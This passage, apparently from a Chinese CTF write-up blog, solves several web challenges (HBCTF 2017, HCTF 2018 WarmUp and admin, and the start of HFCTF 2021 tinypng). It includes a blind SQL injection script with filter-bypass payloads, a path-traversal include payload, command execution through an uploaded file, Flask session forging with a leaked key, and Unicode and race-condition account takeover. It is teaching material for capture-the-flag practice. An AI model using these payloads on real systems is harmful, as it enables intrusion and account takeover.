        <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('file  type error');&lt;/script>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token delimiter">?></span></code></pre>
<h5 id="config-php"><a href="#config-php" class="headerlink" title="config.php"></a>config.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$dbhost</span> <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span>
<span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>
<span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token string">"password987~!@"</span><span class="token punctuation">;</span>
<span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string">"dsqli"</span><span class="token punctuation">;</span>

<span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$dbhost</span><span class="token punctuation">,</span><span class="token variable">$dbuser</span><span class="token punctuation">,</span><span class="token variable">$dbpass</span><span class="token punctuation">,</span><span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$conn</span> <span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"set names utf8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

<span class="token keyword">function</span> <span class="token function">d_addslashes</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$array</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
              <span class="token operator">!</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$value</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$value</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
          <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">d_addslashes</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token variable">$array</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'select'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'update'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'insert'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'delete'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'and'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'or'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'where'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'union'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'like'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'regexp'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'is'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'%'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$id</span> <span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">random_str</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token string">"32"</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$set</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span>  <span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"f"</span><span class="token punctuation">,</span> 
        <span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"j"</span><span class="token punctuation">,</span> <span class="token string">"k"</span><span class="token punctuation">,</span> <span class="token string">"l"</span><span class="token punctuation">,</span>
        <span class="token string">"m"</span><span class="token punctuation">,</span><span class="token string">"n"</span><span class="token punctuation">,</span> <span class="token string">"o"</span><span class="token punctuation">,</span> <span class="token string">"p"</span><span class="token punctuation">,</span> <span class="token string">"q"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span><span class="token string">"s"</span><span class="token punctuation">,</span><span class="token string">"t"</span><span class="token punctuation">,</span><span class="token string">"u"</span><span class="token punctuation">,</span><span class="token string">"v"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">,</span><span class="token string">"x"</span><span class="token punctuation">,</span>
        <span class="token string">"y"</span><span class="token punctuation">,</span><span class="token string">"z"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"6"</span><span class="token punctuation">,</span> <span class="token string">"7"</span><span class="token punctuation">,</span> <span class="token string">"8"</span><span class="token punctuation">,</span> <span class="token string">"9"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token operator">++</span><span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$set</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$set</span><span class="token punctuation">[</span><span class="token variable">$ch</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>可知文件名为<code>./Up10aDs/</code>加上32为随机字母数字再加上原来的后缀名</p>
<h5 id="downfile-php"><a href="#downfile-php" class="headerlink" title="downfile.php"></a>downfile.php</h5><pre><code>$sql = "select location from download where (uid=0 and id='$imageid') or uid=".$_SESSION['userid']." and id=$imageid";</code></pre>
<pre class=" language-Python"><code class="language-Python">import requests
import time

def str_to_hex(s):
    return '0x'+''.join([hex(ord(c)).replace('0x', '') for c in s])

url = "http://f763807e-69f9-4d74-8008-00d034e12fd2.node4.buuoj.cn:81/downfile.php"


headers = {
  'Cookie': '__utma=93156994.1197903980.1594909383.1594909383.1594909383.1; __utmz=93156994.1594909383.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=2e95vmlug30e6l4o8mvap5tsl2'
}



pay = "123456789:abcdefghijklmnopqrstuvwxyz{"
filename="./Up10aDs/"
for j in range(40):
    for i in pay:
        fn = filename+i
        payload = {
            'image': '2 ununionion seleselectct {} oorrder by 1'.format(str_to_hex(fn)),
            'image_download': '%E6%94%B6%E8%97%8F'
        }
        response = requests.request("POST", url, headers=headers, data=payload)
        time.sleep(0.1)
        print(response.text)
        if "1.php"  in response.text:
            filename=filename+chr(ord(i)-1)
            print(filename)
            break
</code></pre>
<p><img src="/2021/09/09/hbctf-2017-da-mei-xi-an/image-20210910193949421.png" alt="image-20210910193949421"></p>
<pre><code>./Up10aDs/3k2451nkq11h9hmnbasc3c6t13m91sss</code></pre>
<pre><code>a=echo `ls`;</code></pre>
<p><img src="/2021/09/09/hbctf-2017-da-mei-xi-an/image-20210910195046053.png" alt="image-20210910195046053"></p>
<pre><code>a=echo `cat  F1AgIsH3r3G00d.php`;</code></pre>
<p><img src="/2021/09/09/hbctf-2017-da-mei-xi-an/image-20210910195057563.png" alt="image-20210910195057563"></p>
]]></content>
  </entry>
  <entry>
    <title>HCTF:2018-WarmUp</title>
    <url>/2021/06/09/hctf-2018-warmup/</url>
    <content><![CDATA[<p><img src="/2021/06/09/hctf-2018-warmup/image-20210609162122575.png" alt="image-20210609162122575"></p>
<pre><code> &lt;?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&amp;$page)
        {
            $whitelist = ["source"=&gt;"source.php","hint"=&gt;"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        &amp;&amp; is_string($_REQUEST['file'])
        &amp;&amp; emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;";
    }  
?&gt; </code></pre>
<p><img src="/2021/06/09/hctf-2018-warmup/image-20210609162411358.png" alt="image-20210609162411358"></p>
<ul>
<li><strong>!empty($_REQUEST[‘file’])</strong>:要我们的file变量不为空</li>
<li><strong>is_string($_REQUEST[‘file’])</strong>:要求我们传进来的值是字符串类型</li>
<li><strong>emmm::checkFile($_REQUEST[‘file’])</strong>:这里将我们的的值传到emmm类里面的checkFile函数</li>
<li>**mb_strpos()**：返回要查找的字符串在别一个字符串中首次出现的位置</li>
<li><strong>mb_substr()</strong>: 函数返回字符串的一部分</li>
<li>第一个if语句对变量进行检验，要求$page为字符串，否则返回false</li>
<li>第二个if语句判断$page是否存在于$whitelist数组中，存在则返回true</li>
<li>第三个if语句判断截取后的$page是否存在于$whitelist数组中，截取$page中’?’前部分，存在则返回true</li>
<li>第四个if语句判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true<br> 若以上四个if语句均未返回值，则返回false</li>
</ul>
<pre><code>index.php?file=hint.php?../../../../../ffffllllaaaagggg</code></pre>
<p><img src="/2021/06/09/hctf-2018-warmup/image-20210609204113988.png" alt="image-20210609204113988"></p>
]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>HCTF:2018-admin</title>
    <url>/2021/06/12/hctf-2018-admin/</url>
    <content><![CDATA[<p><img src="/2021/06/12/hctf-2018-admin/image-20210612203007320.png" alt="image-20210612203007320"></p>
<p>在changepassword</p>
<p><img src="/2021/06/12/hctf-2018-admin/image-20210612203245969.png" alt="image-20210612203245969"></p>
<p>访问用flask写的</p>
<pre><code>@app.route('/code')
def get_code():

@app.route('/index')
def index():

@app.route('/register', methods = ['GET', 'POST'])
def register():

@app.route('/login', methods = ['GET', 'POST'])
def login():

@app.route('/logout')
def logout():

@app.route('/change', methods = ['GET', 'POST'])
def change():

@app.route('/edit', methods = ['GET', 'POST'])
def edit():</code></pre>
<h2 id="法一：flask-session伪造"><a href="#法一：flask-session伪造" class="headerlink" title="法一：flask session伪造"></a>法一：flask session伪造</h2><p>本地脚本解密</p>
<pre><code>#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)

    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of '
                         'an exception')

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before '
                             'decoding the payload')

    return session_json_serializer.loads(payload)

if __name__ == '__main__':
    print(decryption(sys.argv[1].encode()))
</code></pre>
<pre class=" language-python"><code class="language-python">SECRET_KEY <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token string">'ckj123'</span></code></pre>
<p>然后在index.html页面发现只要session[‘name’] == ‘admin’即可以得到flag</p>
<h2 id="法二：Unicode欺骗"><a href="#法二：Unicode欺骗" class="headerlink" title="法二：Unicode欺骗"></a>法二：Unicode欺骗</h2><p>仔细观察路由发现在修改密码的时候先将name转成小写，难道是登陆注册的时候没有转吗？<br><img src="https://img-blog.csdnimg.cn/20190911131540626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>跟进一下register、login</p>
<p><img src="https://img-blog.csdnimg.cn/20190911131548384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="img"></p>
<p>发现都用strlower()来转小写，但是python中已经自带转小写函数lower()，看看有什么不一样的，跟进一下strlower函数</p>
<pre><code>def strlower(username):
    username = nodeprep.prepare(username)
    return username</code></pre>
<p>这里用的nodeprep.prepare函数，而nodeprep是从Twisted模块导入的，在requirements.txt文件中发现Twisted==10.2.0，而官网最新已经到了19.7.0(2019/9)，版本差距很大，应该会存在漏洞。</p>
<p>关于Unicode问题可以参考一下：<a href="https://panda1g1.github.io/2018/11/15/HCTF%20admin/">https://panda1g1.github.io/2018/11/15/HCTF%20admin/</a></p>
<p>关于具体编码可查 <a href="https://unicode-table.com/en/search/?q=small+capital">https://unicode-table.com/en/search/?q=small+capital</a> ，当然你也可以复制过后用站长工具转换成Unicode编码。<br><img src="https://img-blog.csdnimg.cn/20190911131601586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们发现在使用nodeprep.prepare函数转换时过程如下：</p>
<p>ᴬᴰᴹᴵᴺ -&gt; ADMIN -&gt; admin</p>
<p>假如我们注册ᴬᴰᴹᴵᴺ用户，然后在用ᴬᴰᴹᴵᴺ用户登录，因为在login函数里使用了一次nodeprep.prepare函数，因此我们登录上去看到的用户名为ADMIN，此时我们再修改密码，又调用了一次nodeprep.prepare函数将name转换为admin，然后我们就可以改掉admin的密码，最后利用admin账号登录即可拿到flag。</p>
<h2 id="法三：条件竞争"><a href="#法三：条件竞争" class="headerlink" title="法三：条件竞争"></a>法三：条件竞争</h2><p><img src="https://img-blog.csdnimg.cn/20190911131634134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY3NzQwOQ==,size_16,color_FFFFFF,t_70" alt="[外链图片转存失败(img-nsi0LaO3-1568178828389)(/images/HCTF2018-admin/12.png)]"></p>
<p>在session赋值时，登录、注册都是直接进行赋值，未进行安全验证，也就可能存在以下一种可能：<br>我们注册一个用户test，现在有一个进程1一直重复进行登录、改密码操作，进程2一直注销，且以admin用户和进程1所改的密码进行登录，是不是有可能当进程1进行到改密码操作时，进程2恰好注销且要进行登录，此时进程1改密码需要一个session，而进程2刚好将session[‘name’]赋值为admin，然后进程1调用此session修改密码，即修改了admin的密码。</p>
<p>原文链接：<a href="https://blog.csdn.net/weixin_44677409/article/details/100733581">https://blog.csdn.net/weixin_44677409/article/details/100733581</a></p>
]]></content>
  </entry>
  <entry>
    <title>HFCTF：2021-tinypng</title>
    <url>/2021/09/08/hfctf-2021-tinypng/</url>
    <content><![CDATA[<p>下载源码</p>
<p>发现是laravel框架</p>
<h5 id="routes-web-php"><a href="#routes-web-php" class="headerlink" title="routes/web.php"></a>routes/web.php</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">use</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Controllers<span class="token punctuation">\</span>IndexController</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Controllers<span class="token punctuation">\</span>ImageController</span><span class="token punctuation">;</span>

Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>IndexController<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string">'fileUpload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token string">'file.upload.post'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//Don't expose the /image to others!</span>
Route<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/image'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>ImageController<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token string">'handle'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token string">'image.handle'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>index路由指向IndexController的fileUpload方法<br> image路由指向ImageController的handle方法</p>
<h5 id="app-Http-Controllers-IndexController-php"><a href="#app-Http-Controllers-IndexController-php" class="headerlink" title="app/Http/Controllers/IndexController.php"></a>app/Http/Controllers/IndexController.php</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Controllers</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Request</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">fileUpload</span><span class="token punctuation">(</span>Request <span class="token variable">$req</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$allowed_extension</span> <span class="token operator">=</span> <span class="token string">"png"</span><span class="token punctuation">;</span>
        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token variable">$req</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">clientExtension</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$extension</span> <span class="token operator">===</span> <span class="token variable">$allowed_extension</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$req</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">204800</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$req</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/&lt;\?|php|HALT\_COMPILER/i"</span><span class="token punctuation">,</span> <span class="token variable">$content</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string">'Don\'t do that, please'</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                    <span class="token operator">-</span><span class="token operator">></span><span class="token function">withErrors</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token variable">$fileName</span> <span class="token operator">=</span> \<span class="token package">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'.png'</span><span class="token punctuation">;</span>
                <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token variable">$req</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">storePubliclyAs</span><span class="token punctuation">(</span><span class="token string">'uploads'</span><span class="token punctuation">,</span> <span class="token variable">$fileName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">echo</span> <span class="token string">"path: $path"</span><span class="token punctuation">;</span>
